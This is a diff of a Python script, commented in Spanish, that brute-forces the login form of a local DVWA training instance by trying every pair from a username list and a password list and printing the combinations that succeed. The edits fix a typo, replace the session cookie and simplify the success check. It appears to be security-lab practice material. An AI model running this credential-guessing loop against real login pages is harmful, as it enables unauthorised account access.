@@ -1,4 +1,4 @@
-mport requests
+import requests
 
 url = 'http://localhost:8080/vulnerabilities/brute/'
 
@@ -7,15 +7,13 @@ users_file = 'userlist.txt'
 passwords_file = 'passwordlist.txt'
 
 # Cabeceras HTTP a utilizar para la solicitud
-# Cabeceras HTTP a utilizar para la solicitud
 headers = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
     'Content-Type': 'application/x-www-form-urlencoded'
 }
-
- # Cookies de autenticación necesarias para DVWA (supone que ya has iniciado ses>
+#colocar phpsessid de inicio de sesion
 cookies = {
-    'PHPSESSID': '841f251197d5f64456b3c2f0df2dbf99',
+    'PHPSESSID': '0537ef682d77eb4ae4fb23df8861956d',
     'security': 'low'  # Nivel de seguridad bajo en DVWA
 }
 
@@ -39,10 +37,8 @@ def brute_force_attack():
 
             response = requests.post(url, headers=headers,cookies=cookies, params=data)
 
-            soup = BeautifulSoup(response.text, 'html.parser')
-            print(response.text)
-            # se verifica el contenido de la página para encontrar el mensaje correcto
-            if 'Welcome to the password protected area' in soup.text:
+            # se verifica el contenido de la página para encontrar el mensaje a interes
+            if 'Welcome to the password protected area' in response.text:
                 print(f'[SUCCESS] Usuario: {username} Contraseña: {password}')
             else:
                 pass
